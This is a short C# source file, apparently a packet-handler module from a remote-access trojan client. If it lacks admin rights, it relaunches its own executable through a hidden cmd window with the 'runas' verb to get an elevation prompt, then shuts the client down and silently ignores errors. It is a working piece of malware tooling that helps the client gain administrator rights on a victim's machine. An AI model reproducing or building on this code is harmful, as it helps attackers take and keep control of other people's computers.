using Client.Helper;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
    public class HandleUAC
    {
        public HandleUAC()
        {
            if (Methods.IsAdmin()) return;

            try
            {
                Process proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/k START \"\" \"" + Process.GetCurrentProcess().MainModule.FileName + "\" & EXIT",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
                        UseShellExecute = true
                    }
                };
                proc.Start();
                Methods.ClientExit();
                Environment.Exit(0);
            }
            catch { }
        }
    }
}
